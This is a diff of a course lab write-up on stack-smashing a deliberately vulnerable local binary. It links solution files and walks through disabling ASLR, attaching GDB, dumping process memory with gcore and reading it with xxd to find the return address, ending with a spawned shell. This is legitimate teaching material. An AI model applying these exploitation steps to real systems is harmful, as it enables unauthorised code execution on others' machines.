@@ -425,6 +425,13 @@ Stack smashing is an archaic method of binary exploitation that modern computers
 Thanks to Address Space Layout Randomization (ASLR) that modern operating systems are equipped with, it would be very difficult to execute this exploit.
 Nonetheless, this is a fun exercise and we have learned a lot from it.
 
+Solution files can be found here:
+
+- [egg](https://github.com/0x42697262/CMSC134-Writeups/blob/main/Machine_Problem_1/solutions/egg)
+- [exploit.py](https://github.com/0x42697262/CMSC134-Writeups/blob/main/Machine_Problem_1/solutions/exploit.py)
+- [shellcode.asm](https://github.com/0x42697262/CMSC134-Writeups/blob/main/Machine_Problem_1/solutions/shellcode.asm)
+- [shellcode.o](https://github.com/0x42697262/CMSC134-Writeups/blob/main/Machine_Problem_1/solutions/shellcode.o)
+
 ---
 
 ## Acknowledgement and References
@@ -436,7 +443,7 @@ Nonetheless, this is a fun exercise and we have learned a lot from it.
 
 ## Extra
 
-### Did you expect this?
+### Return Me Shell!
 
 Writing a shellcode for exit status is quite boring.
 Why don't we pop a shell instead?
@@ -555,12 +562,16 @@ $ python exploit.py | setarch $(uname -m) -R ./vuln
 
 This execution may or may not work as the memory addresses in GDB compared to being ran directly are different.
 This can be fixed by figuring out the exact memory address.
-There are many ways to do it but the simplest one that we have already done is through GDB and attaching GDB to the process of the program
+There are many ways to do it but the simplest one that we have already done is through GDB and attaching GDB to the process of the program.
+The process of debugging with an attached process is similar.
+First run the vulnerable program with `setarch` and open up another terminal with GDB by attaching to the vulnerable process
 
 ```sh
 $ setarch $(uname -m) -R ./vuln
 $ gdb -p <process id>
 ```
+
+To find the process id, use `ps aux`.
 
 And if this does not work, we can use `gcore` to dump the current memory of a process id and manually find our input
 
@@ -568,7 +579,60 @@ And if this does not work, we can use `gcore` to dump the current memory of a pr
 $ gcore <process id>
 ```
 
-Once the correct return address is acquired, we can now rerun the exploit
+Run the program again and find its process id
+
+```sh
+$ setarch $(uname -m) -R ./vuln
+$ ps aux | grep vuln
+
+birb     1450296 71.4  0.0   2732  1096 pts/9    R+   10:32   5:17 ./vuln
+```
+
+Here, the process id is `1450296`.
+We then dump the memory of the process after our input back in the program (I used `ABCDEFGH`)
+
+```sh
+$ gcore 1450296
+
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+0x5655619a in main ()
+Saved corefile core.1450296
+[Inferior 1 (process 1450296) detached]
+```
+
+This will create a core file dump in binary format.
+Read the coredump in hex using any hex editor tools available, we'll use good old `xxd` and pipe it to `vim`
+
+```sh
+$ xxd -g 4 core.1450296 | vim
+```
+
+Then find the input (which is `ABCD`).
+There will be two results, find the memory addresses that contains the most likely data
+
+```
+...
+000043c0: 00000000 00000000 00000000 00000000  ................
+000043d0: 11040000 41424344 0a000000 00000000  ....ABCD........
+000043e0: 00000000 00000000 00000000 00000000  ................
+...
+```
+
+vs
+
+```
+...
+00074f50: 00000000 2cfee1f7 0cceffff 60cbfff7  ....,.......`...
+00074f60: 40cdffff 8c615556 38cdffff 41424344  @....aUV8...ABCD
+00074f70: 00000000 48cdffff 9a615556 00000000  ....H....aUV....
+...
+```
+
+The second result is more likely to contain the EBP and ESP which may be `0x48cdffff` and `0x9a615556`.
+We will use `0x44cdffff` (whose value is `0x00000000`), subtract 4 bytes to point to the return address `0x9a615556` to replace its value.
+
+Replace the EIP in the script with the correct return address, we can now rerun the exploit
 
 ```python
 $ python exploit.py | setarch $(uname -m) -R ./vuln
@@ -576,7 +640,8 @@ sh-5.2$ uname -a
 Linux NuclearChicken 6.7.4-arch1-1 #1 SMP PREEMPT_DYNAMIC Mon, 05 Feb 2024 22:07:49 +0000 x86_64 GNU/Linux
 ```
 
-And we got a shell!
+And voila!
+We got a shell!
 
 To conclude, there is not much difference in doing this method compared to GDB aside from automating the exploitation.
 The difficulty of running the program outside GDB lies on the ASLR (if enabled) and computers having allocating memory differently.
